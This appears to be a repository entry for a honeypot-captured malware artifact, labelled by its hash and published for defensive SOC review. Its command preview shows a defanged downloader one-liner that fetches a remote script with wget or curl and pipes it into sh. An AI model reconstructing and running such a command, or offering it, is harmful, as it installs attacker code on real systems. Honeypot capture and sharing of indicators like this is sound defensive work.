# 357c8ecc062a6871fc4aa41abe9bb7a0748e58a823c3f43d1f251fd8376ca61c

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `357c8ecc062a6871fc4aa41abe9bb7a0748e58a823c3f43d1f251fd8376ca61c` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
(wget --no-check-certificate -qO- hxxps://217[.]60[.]195[.]XXX/sh || curl -sk hxxps://217[.]60[.]195[.]XXX/sh) | sh -s apache[.]selfre
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
